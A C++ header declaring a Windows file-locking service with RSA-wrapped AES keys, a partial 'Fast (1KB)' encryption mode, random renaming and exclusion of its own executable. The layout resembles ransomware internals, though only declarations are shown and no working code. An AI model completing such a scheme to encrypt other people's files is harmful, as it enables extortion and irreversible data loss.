#pragma once
#include <filesystem>
#include <string>
#include <windows.h>

namespace fs = std::filesystem;

// Constants
extern const std::string MAGIC_SIGNATURE;
extern const std::string ENCRYPTED_EXTENSION;
extern fs::path g_selfExePath;

#pragma pack(push, 1)
struct UnencryptedHeader {
    char magic[8];                  // "LOCK2373"
    uint32_t version;               // 1
    uint32_t mode;                  // 0 = Fast (1KB), 1 = Full
    uint32_t auth_type;             // 1 = RSA Key, 2 = Password
    uint8_t iv[16];                 // AES IV
    uint8_t verification_hash[32];  // SHA-256(AES_Key + "verify")
    uint32_t encrypted_key_len;     // 256 for RSA, 0 for password
    uint8_t encrypted_key[256];     // RSA-encrypted AES key
    uint32_t encrypted_meta_len;    // Length of the encrypted metadata block
};
#pragma pack(pop)

class FileService {
public:
    static bool IsPathExcluded(const fs::path& path);
    static std::string GenerateRandomName();
    static bool LockFile(const fs::path& filePath, const std::string& rsaPubKeyB64, const std::string& password, bool fullMode);
    static bool UnlockFile(const fs::path& filePath, const std::string& rsaPrivKeyB64, const std::string& password);
};
